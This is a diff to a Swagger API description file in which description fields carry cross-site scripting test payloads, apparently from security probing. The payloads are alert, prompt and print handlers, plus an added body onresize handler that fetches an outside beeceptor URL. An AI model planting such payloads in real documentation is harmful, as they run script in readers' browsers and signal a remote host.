@@ -2,7 +2,8 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    hello world !! This is just a test number <img src=x onerror=alert(1)>
+    hello world !! This is just a test number <body onresize=print()>
+ 
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +29,7 @@ paths:
     delete:
       parameters:
         - description: |
-            hello world <script>prompt(1)</script>
+            hello world <body onresize=fetch("https://sekeratest.free.beeceptor.com")>
 
           format: int64
           in: path
